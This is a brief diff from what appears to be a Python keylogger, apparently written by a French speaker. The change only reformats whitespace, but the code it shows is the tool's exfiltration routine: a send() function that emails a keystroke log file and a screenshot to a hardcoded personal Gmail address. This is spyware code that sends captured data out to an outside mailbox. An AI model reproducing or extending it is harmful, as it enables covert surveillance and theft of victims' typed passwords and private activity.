@@ -20,8 +20,8 @@ def send():
     sendMail.send_mail(receiver_email="oussamaau123@gmail.com",
                        subject="Fichier du keylog",
                        body="Envoi du fichier keylog",
-                       attachments=["keylogs.txt","screen.png"]
-                    )
+                       attachments=["keylogs.txt", "screen.png"]
+                       )
 
 #--------FIN PARTIE ENVOI MAIL------------------
 
